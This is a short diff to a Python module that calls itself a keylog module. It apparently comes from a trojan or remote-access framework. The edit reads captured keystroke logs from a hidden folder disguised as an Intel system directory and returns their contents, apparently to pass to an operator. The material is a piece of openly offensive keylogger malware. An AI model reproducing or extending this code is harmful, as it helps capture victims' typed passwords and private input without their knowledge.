@@ -1,8 +1,14 @@
 def run(**args):
-  print "[*] In keylog module."
-  fp=open("C:\\Intel Architecture\\cpu\\2016-01-21-15-07-34.txt","r")
-  words=fp.readlines()
+  #print "[*] In keylog module."
+  files=os.listdir("C:\\Intel Architecture\\cpu\\")
+  count=-1
+  fileName="C:\\Intel Architecture\\cpu\\"
   str=""
+  for file in files:
+    count+=1
+  fileName+=files[count]
+  fp=open(fileName,"r")
+  words=fp.readlines()
   for word in words:
     str+=word
   return str
